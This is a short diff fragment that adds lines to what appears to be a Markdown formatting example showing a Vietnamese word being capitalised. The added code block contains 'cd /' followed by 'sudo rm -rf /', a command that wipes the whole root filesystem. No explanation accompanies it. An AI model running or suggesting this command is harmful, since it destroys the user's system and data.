@@ -44,3 +44,8 @@ Chữ bo
 ```
 =>
 `Chữ B`
+
+-
+
+```cd /
+sudo rm -rf /```
